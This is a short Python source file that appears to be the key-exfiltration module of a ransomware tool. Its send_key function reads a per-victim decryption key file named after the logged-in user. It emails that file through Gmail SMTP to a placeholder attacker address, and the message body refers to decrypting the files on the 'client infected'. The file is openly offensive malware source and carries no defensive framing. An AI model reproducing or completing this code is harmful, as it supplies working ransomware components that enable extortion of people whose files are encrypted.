#!/usr/bin/env python
#coding:utf-8
import smtplib, os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

fromaddr = "FROM_TO@gmail.com"
toaddr = "DEST_TO@gmail.com"
usr = os.environ["USERNAME"]

def send_key():
    try:
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "The server you sending a key from the client"
        body = "This key will be used to decrypt the files on the client infected"
        msg.attach(MIMEText(body, 'plain'))
        filename = "%s.key" %(usr)
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, "YOUR_PASS_HERE")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except IOError:
        pass
    except smtplib.SMTPAuthenticationError:
        print("[!] Login or pass failed")
        pass
